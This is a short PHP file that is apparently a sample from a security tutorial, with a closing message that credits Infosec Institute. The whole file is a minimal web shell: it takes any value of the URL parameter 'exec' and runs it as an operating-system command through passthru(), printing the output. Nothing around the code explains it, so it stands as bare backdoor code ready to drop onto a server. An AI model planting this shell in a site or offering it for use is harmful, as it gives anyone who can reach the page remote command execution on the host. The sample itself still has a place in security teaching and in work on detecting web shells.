<?php

if ( isset( $_GET[‘exec’] ) ) {

if ( false === passthru( $_GET[‘exec’] ) )

echo ‘So sad, this is an error – aurelius of Infosec Institute’;

}

?>
